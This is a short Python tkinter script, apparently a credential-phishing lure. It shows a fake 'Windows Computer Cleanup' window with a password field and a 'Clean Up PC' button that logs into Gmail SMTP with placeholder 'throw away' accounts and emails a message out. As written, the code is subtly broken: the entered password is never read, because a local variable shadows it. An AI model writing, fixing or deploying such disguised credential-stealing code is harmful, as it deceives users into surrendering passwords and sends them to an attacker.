from tkinter import *
import smtplib

def send_password():
    sender_email = "throw away sender email here"
    receiver_email = "throw away receiver email here"
    password = "throw away sender email password here"
    message = password
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, message)

window = Tk()
window.title('Windows Computer Cleanup')

password = Entry(window, text='')
password.pack()

button = Button(window, text='Clean Up PC', command = send_password)
button.pack()

window.geometry("300x200")

window.mainloop()